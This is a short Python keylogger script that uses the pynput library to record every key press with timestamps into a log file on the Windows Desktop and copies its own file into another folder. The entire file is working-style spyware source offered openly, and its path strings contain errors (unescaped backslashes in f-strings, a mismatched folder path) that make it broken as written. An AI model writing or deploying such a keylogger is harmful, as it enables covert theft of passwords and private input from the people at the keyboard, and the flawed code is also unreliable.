from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

user = os.getlogin()
log_dir = f"C:\Users\{user}\Desktop"

copyfile("keylogger.py", f"C:\Users\{user}\SERKAN\Desktop\NEW PROJECT 2")

logging.basicConfig(filename = f"{log_dir}\\log.txt", level = logging.DEBUG, format = "%(asctime)s : %(message)s")

def handler(key):
    logging.info(key)

with Listener(on_press= handler) as listener:
    listener.join()
